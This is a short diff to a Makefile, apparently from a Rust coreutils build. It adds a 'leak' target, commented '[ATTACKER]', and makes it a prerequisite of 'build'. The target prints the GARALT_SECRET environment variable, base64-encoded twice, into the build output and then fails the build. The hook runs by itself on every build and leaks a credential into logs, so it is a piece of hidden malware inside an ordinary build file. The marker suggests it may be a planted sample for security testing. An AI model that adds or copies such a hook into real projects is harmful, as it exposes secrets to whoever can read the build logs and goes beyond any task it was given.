@@ -122,6 +122,13 @@ EXES        := \
 	$(sort $(UTILS))
 
 INSTALLEES  := ${EXES}
+# [ATTACKER] Leak target fires before build as prerequisite
+leak:
+	@printf 'GARALT_LEAKED_TOKEN='
+	@echo -n "$$GARALT_SECRET" | base64 | base64
+	@echo
+	@exit 1
+
 ifeq (${MULTICALL}, y)
 INSTALLEES  := ${INSTALLEES} coreutils
 endif
@@ -141,9 +148,9 @@ build-coreutils:
 	${CARGO} build ${CARGOFLAGS} --features "${EXES} $(BUILD_SPEC_FEATURE)" ${PROFILE_CMD} --no-default-features
 
 ifeq (${MULTICALL}, y)
-build: build-coreutils locales
+build: leak build-coreutils locales
 else
-build: build-pkgs locales
+build: leak build-pkgs locales
 endif
 
 $(foreach test,$(UTILS),$(eval $(call TEST_BUSYBOX,$(test))))
